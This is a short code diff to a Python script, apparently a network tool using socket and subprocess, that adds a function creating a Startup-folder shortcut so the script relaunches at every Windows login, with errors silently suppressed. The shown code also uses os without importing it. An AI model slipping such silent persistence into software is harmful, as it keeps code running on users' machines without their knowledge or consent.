@@ -1,5 +1,25 @@
 import socket
 import subprocess
+import winshell
+from win32com.client import Dispatch
+
+def iniciar_com_windows():
+    caminho_programa = os.path.abspath(__file__)
+    pasta_inicializar = winshell.startup()
+
+    atalho = os.path.join(pasta_inicializar, "MeuPrograma.lnk")
+
+    shell = Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(atalho)
+
+    shortcut.Targetpath = caminho_programa
+    shortcut.WorkingDirectory = os.path.dirname(caminho_programa)
+    shortcut.save()
+
+try:
+    iniciar_com_windows()
+except:
+    pass
 
 def detectar_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
